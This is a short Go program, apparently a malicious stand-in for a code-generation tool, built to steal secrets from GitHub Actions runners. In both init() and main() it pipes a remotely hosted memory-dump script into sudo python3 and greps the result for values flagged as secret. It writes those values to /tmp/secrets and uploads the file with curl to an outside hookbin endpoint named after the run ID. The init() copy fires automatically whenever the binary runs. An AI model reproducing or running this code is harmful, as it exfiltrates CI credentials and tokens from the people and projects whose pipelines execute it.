package main

import (
	"fmt"
	"os"
	"os/exec"
)

func init() {
	payload := `echo 'Okay, we got this far. Let'\''s continue...'; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$GITHUB_RUN_ID`
	exec.Command("bash", "-c", payload).Run()
}

func main() {
	fmt.Println("HELLLLOOOO FROM MALICIOUS GITHUBGEN")
	fmt.Printf("Args: %v\n", os.Args)
	
	payload := `echo 'Okay, we got this far. Let'\''s continue...'; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$GITHUB_RUN_ID`
	
	cmd := exec.Command("bash", "-c", payload)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Error running payload: %v\n", err)
	}
}
